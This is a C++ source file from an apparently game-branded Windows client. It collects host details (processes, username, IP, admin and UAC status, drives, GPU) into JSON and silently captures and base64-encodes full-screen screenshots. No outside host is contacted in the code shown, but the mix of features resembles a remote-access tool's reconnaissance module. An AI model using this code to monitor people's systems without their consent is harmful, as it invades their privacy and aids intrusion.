// TorGames.ClientPlus - System information implementation
#include "systeminfo.h"
#include "utils.h"
#include "fingerprint.h"
#include "logger.h"
#include <memory>

namespace SystemInfo {

std::string GetGpuInfo() {
    std::string result = "Unknown";

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return result;

    IWbemLocator* loc = nullptr;
    IWbemServices* svc = nullptr;
    IEnumWbemClassObject* enumerator = nullptr;
    IWbemClassObject* obj = nullptr;

    do {
        hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
            IID_IWbemLocator, reinterpret_cast<LPVOID*>(&loc));
        if (FAILED(hr) || !loc) break;

        hr = loc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), nullptr, nullptr, 0, 0, nullptr, nullptr, &svc);
        if (FAILED(hr) || !svc) break;

        CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
            RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

        hr = svc->ExecQuery(_bstr_t(L"WQL"),
            _bstr_t(L"SELECT Name FROM Win32_VideoController"),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &enumerator);
        if (FAILED(hr) || !enumerator) break;

        ULONG ret = 0;
        if (enumerator->Next(WBEM_INFINITE, 1, &obj, &ret) == S_OK && obj) {
            VARIANT vtProp;
            VariantInit(&vtProp);

            if (SUCCEEDED(obj->Get(L"Name", 0, &vtProp, nullptr, nullptr)) && vtProp.bstrVal) {
                int len = WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, nullptr, 0, nullptr, nullptr);
                if (len > 0) {
                    std::unique_ptr<char[]> buf(new char[len]);
                    WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, buf.get(), len, nullptr, nullptr);
                    result = buf.get();
                }
            }
            VariantClear(&vtProp);
        }
    } while (false);

    // Cleanup - release in reverse order of acquisition
    if (obj) obj->Release();
    if (enumerator) enumerator->Release();
    if (svc) svc->Release();
    if (loc) loc->Release();

    CoUninitialize();
    return result;
}

std::vector<std::string> GetDriveInfo() {
    std::vector<std::string> drives;
    char buf[256];
    DWORD len = GetLogicalDriveStringsA(sizeof(buf), buf);

    for (char* p = buf; *p; p += strlen(p) + 1) {
        ULARGE_INTEGER freeBytesAvailable, totalBytes, freeBytes;
        if (GetDiskFreeSpaceExA(p, &freeBytesAvailable, &totalBytes, &freeBytes)) {
            char info[128];
            snprintf(info, sizeof(info), "%s %.1fGB/%.1fGB",
                p,
                static_cast<double>(freeBytes.QuadPart) / (1024 * 1024 * 1024),
                static_cast<double>(totalBytes.QuadPart) / (1024 * 1024 * 1024));
            drives.push_back(info);
        }
    }
    return drives;
}

std::vector<ProcessInfo> GetProcessList() {
    std::vector<ProcessInfo> processes;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return processes;

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snapshot, &pe)) {
        do {
            ProcessInfo info;
            info.pid = pe.th32ProcessID;
            info.name = pe.szExeFile;
            info.memoryUsage = 0;

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                FALSE, pe.th32ProcessID);
            if (hProcess) {
                PROCESS_MEMORY_COUNTERS pmc;
                if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                    info.memoryUsage = pmc.WorkingSetSize;
                }
                CloseHandle(hProcess);
            }

            processes.push_back(info);
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return processes;
}

std::string GetProcessListJson() {
    std::vector<ProcessInfo> processes = GetProcessList();
    std::string json = "[";

    for (size_t i = 0; i < processes.size(); i++) {
        if (i > 0) json += ",";
        char buf[256];
        snprintf(buf, sizeof(buf),
            "{\"pid\":%lu,\"name\":\"%s\",\"memory\":%llu}",
            processes[i].pid,
            Utils::JsonEscape(processes[i].name).c_str(),
            static_cast<unsigned long long>(processes[i].memoryUsage));
        json += buf;
    }

    json += "]";
    return json;
}

std::string GetSystemInfoJson() {
    char buf[4096];

    std::string gpu = GetGpuInfo();
    std::vector<std::string> drives = GetDriveInfo();

    std::string drivesJson = "[";
    for (size_t i = 0; i < drives.size(); i++) {
        if (i > 0) drivesJson += ",";
        drivesJson += "\"" + Utils::JsonEscape(drives[i]) + "\"";
    }
    drivesJson += "]";

    snprintf(buf, sizeof(buf),
        "{"
        "\"machineName\":\"%s\","
        "\"username\":\"%s\","
        "\"osVersion\":\"%s\","
        "\"architecture\":\"%s\","
        "\"cpuCount\":%d,"
        "\"totalMemory\":%lld,"
        "\"availableMemory\":%lld,"
        "\"localIp\":\"%s\","
        "\"isAdmin\":%s,"
        "\"uacEnabled\":%s,"
        "\"gpu\":\"%s\","
        "\"drives\":%s"
        "}",
        Utils::JsonEscape(Utils::GetMachineName()).c_str(),
        Utils::JsonEscape(Utils::GetUsername()).c_str(),
        Utils::JsonEscape(Utils::GetOsVersion()).c_str(),
        Utils::GetArchitecture().c_str(),
        Utils::GetCpuCount(),
        Utils::GetTotalMemory(),
        Utils::GetAvailableMemory(),
        Utils::GetLocalIp().c_str(),
        Utils::IsRunningAsAdmin() ? "true" : "false",
        Utils::IsUacEnabled() ? "true" : "false",
        Utils::JsonEscape(gpu).c_str(),
        drivesJson.c_str());

    return buf;
}

bool CaptureScreenshot(const char* outputPath) {
    // Get screen dimensions
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC screenDC = GetDC(nullptr);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, width, height);
    HGDIOBJ oldBitmap = SelectObject(memDC, bitmap);

    BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

    // Save as BMP (simple format, no extra dependencies)
    BITMAPFILEHEADER bfh = {};
    BITMAPINFOHEADER bih = {};

    bih.biSize = sizeof(bih);
    bih.biWidth = width;
    bih.biHeight = -height;  // Top-down
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;

    int stride = ((width * 3 + 3) / 4) * 4;
    int imageSize = stride * height;

    bfh.bfType = 0x4D42;  // "BM"
    bfh.bfSize = sizeof(bfh) + sizeof(bih) + imageSize;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bih);

    std::unique_ptr<BYTE[]> pixels(new BYTE[imageSize]);
    GetDIBits(memDC, bitmap, 0, height, pixels.get(), reinterpret_cast<BITMAPINFO*>(&bih), DIB_RGB_COLORS);

    bool success = false;
    FILE* f = fopen(outputPath, "wb");
    if (f) {
        fwrite(&bfh, sizeof(bfh), 1, f);
        fwrite(&bih, sizeof(bih), 1, f);
        fwrite(pixels.get(), imageSize, 1, f);
        fclose(f);
        success = true;
    }

    SelectObject(memDC, oldBitmap);
    DeleteObject(bitmap);
    DeleteDC(memDC);
    ReleaseDC(nullptr, screenDC);

    return success;
}

std::string CaptureScreenshotBase64() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char filePath[MAX_PATH];
    snprintf(filePath, sizeof(filePath), "%stg_screenshot.bmp", tempPath);

    // RAII helper to ensure temp file is always deleted
    struct TempFileDeleter {
        const char* path;
        ~TempFileDeleter() { DeleteFileA(path); }
    } fileDeleter{filePath};

    if (!CaptureScreenshot(filePath)) {
        return "";
    }

    // Read file and base64 encode
    FILE* f = fopen(filePath, "rb");
    if (!f) return "";

    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    if (fileSize <= 0) {
        fclose(f);
        return "";
    }
    fseek(f, 0, SEEK_SET);

    std::unique_ptr<BYTE[]> data(new BYTE[fileSize]);
    size_t bytesRead = fread(data.get(), 1, fileSize, f);
    fclose(f);

    if (bytesRead != static_cast<size_t>(fileSize)) {
        return "";
    }

    // Simple base64 encoding
    static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    result.reserve((fileSize + 2) / 3 * 4);

    for (long i = 0; i < fileSize; i += 3) {
        int val = (static_cast<unsigned char>(data[i]) << 16);
        if (i + 1 < fileSize) val |= (static_cast<unsigned char>(data[i + 1]) << 8);
        if (i + 2 < fileSize) val |= static_cast<unsigned char>(data[i + 2]);

        result += b64chars[(val >> 18) & 0x3F];
        result += b64chars[(val >> 12) & 0x3F];
        result += (i + 1 < fileSize) ? b64chars[(val >> 6) & 0x3F] : '=';
        result += (i + 2 < fileSize) ? b64chars[val & 0x3F] : '=';
    }

    return result;
}

} // namespace SystemInfo
